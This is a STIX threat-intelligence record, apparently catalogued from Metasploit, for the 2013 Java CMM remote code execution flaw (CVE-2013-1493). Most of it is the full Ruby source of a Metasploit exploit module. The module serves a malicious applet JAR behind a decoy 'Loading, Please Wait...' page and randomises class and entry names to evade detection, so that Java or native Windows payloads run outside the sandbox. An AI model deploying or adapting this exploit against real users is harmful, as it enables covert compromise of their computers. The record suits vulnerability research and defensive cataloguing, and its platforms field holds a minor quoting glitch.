{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9defc8f7-4f26-4b9b-99fd-7bbb9b395f64",
    "created": "2024-08-14T16:42:42.181743Z",
    "modified": "2024-08-14T16:42:42.181747Z",
    "name": "Java CMM Remote Code Execution",
    "description": " This module abuses the Color Management classes from a Java Applet to run arbitrary Java code outside of the sandbox as exploited in the wild in February and March of 2013. The vulnerability affects Java version 7u15 and earlier and 6u41 and earlier and has been tested successfully on Windows XP SP3 and Windows 7 SP1 systems. This exploit doesn't bypass click-to-play, so the user must accept the java warning in order to run the malicious applet.  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/java_cmm.rb",
            "external_id": "java_cmm.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-1493"
        },
        {
            "source_name": "reference",
            "url": "https://blogs.oracle.com/security/entry/security_alert_cve_2013_1493"
        },
        {
            "source_name": "reference",
            "url": "http://www.oracle.com/technetwork/topics/security/alert-cve-2013-1493-1915081.html"
        },
        {
            "source_name": "reference",
            "url": "http://pastie.org/pastes/6581034"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({ :javascript => false })\n\n  def initialize( info = {} )\n\n    super( update_info( info,\n      'Name'          => 'Java CMM Remote Code Execution',\n      'Description'   => %q{\n          This module abuses the Color Management classes from a Java Applet to run\n        arbitrary Java code outside of the sandbox as exploited in the wild in February\n        and March of 2013. The vulnerability affects Java version 7u15 and earlier and 6u41\n        and earlier and has been tested successfully on Windows XP SP3 and Windows 7 SP1\n        systems. This exploit doesn't bypass click-to-play, so the user must accept the java\n        warning in order to run the malicious applet.\n      },\n      'License'       => MSF_LICENSE,\n      'Author'        =>\n        [\n          'Unknown', # Vulnerability discovery and Exploit\n          'juan vazquez' # Metasploit module (just ported the published exploit)\n        ],\n      'References'    =>\n        [\n          [ 'CVE', '2013-1493' ],\n          [ 'OSVDB', '90737' ],\n          [ 'BID', '58238' ],\n          [ 'URL', 'https://blogs.oracle.com/security/entry/security_alert_cve_2013_1493' ],\n          [ 'URL', 'http://www.oracle.com/technetwork/topics/security/alert-cve-2013-1493-1915081.html' ],\n          [ 'URL', 'http://pastie.org/pastes/6581034' ]\n        ],\n      'Platform'      => %w{ java win },\n      'Payload'       => { 'Space' => 20480, 'BadChars' => '', 'DisableNops' => true },\n      'Targets'       =>\n        [\n          [ 'Generic (Java Payload)',\n            {\n              'Platform' => 'java',\n              'Arch' => ARCH_JAVA\n            }\n          ],\n          [ 'Windows x86 (Native Payload)',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_X86\n            }\n          ]\n        ],\n      'DefaultTarget'  => 1,\n      'DisclosureDate' => '2013-03-01'\n    ))\n  end\n\n\n  def setup\n    path = File.join(Msf::Config.data_directory, \"exploits\", \"cve-2013-1493\", \"Init.class\")\n    @init_class = File.open(path, \"rb\") {|fd| fd.read(fd.stat.size) }\n    path = File.join(Msf::Config.data_directory, \"exploits\", \"cve-2013-1493\", \"Leak.class\")\n    @leak_class = File.open(path, \"rb\") {|fd| fd.read(fd.stat.size) }\n    path = File.join(Msf::Config.data_directory, \"exploits\", \"cve-2013-1493\", \"MyBufferedImage.class\")\n    @buffered_image_class = File.open(path, \"rb\") {|fd| fd.read(fd.stat.size) }\n    path = File.join(Msf::Config.data_directory, \"exploits\", \"cve-2013-1493\", \"MyColorSpace.class\")\n    @color_space_class = File.open(path, \"rb\") {|fd| fd.read(fd.stat.size) }\n\n    @init_class_name = rand_text_alpha(\"Init\".length)\n    @init_class.gsub!(\"Init\", @init_class_name)\n    super\n  end\n\n  def on_request_uri(cli, request)\n    print_status(\"handling request for #{request.uri}\")\n\n    case request.uri\n    when /\\.jar$/i\n      jar = payload.encoded_jar\n      jar.add_file(\"#{@init_class_name}.class\", @init_class)\n      jar.add_file(\"Leak.class\", @leak_class)\n      jar.add_file(\"MyBufferedImage.class\", @buffered_image_class)\n      jar.add_file(\"MyColorSpace.class\", @color_space_class)\n      metasploit_str = rand_text_alpha(\"metasploit\".length)\n      payload_str = rand_text_alpha(\"payload\".length)\n      jar.entries.each { |entry|\n        entry.name.gsub!(\"metasploit\", metasploit_str)\n        entry.name.gsub!(\"Payload\", payload_str)\n        entry.data = entry.data.gsub(\"metasploit\", metasploit_str)\n        entry.data = entry.data.gsub(\"Payload\", payload_str)\n      }\n      jar.build_manifest\n\n      send_response(cli, jar, { 'Content-Type' => \"application/octet-stream\" })\n    when /\\/$/\n      payload = regenerate_payload(cli)\n      if not payload\n        print_error(\"Failed to generate the payload.\")\n        send_not_found(cli)\n        return\n      end\n      send_response_html(cli, generate_html, { 'Content-Type' => 'text/html' })\n    else\n      send_redirect(cli, get_resource() + '/', '')\n    end\n\n  end\n\n  def generate_html\n    html  = %Q|<html><head><title>Loading, Please Wait...</title></head>|\n    html += %Q|<body><center><p>Loading, Please Wait...</p></center>|\n    html += %Q|<applet archive=\"#{rand_text_alpha(8)}.jar\" code=\"#{@init_class_name}.class\" width=\"1\" height=\"1\">|\n    html += %Q|</applet></body></html>|\n    return html\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-03-01",
    "x_mitre_platforms": [
        "win'"
    ]
}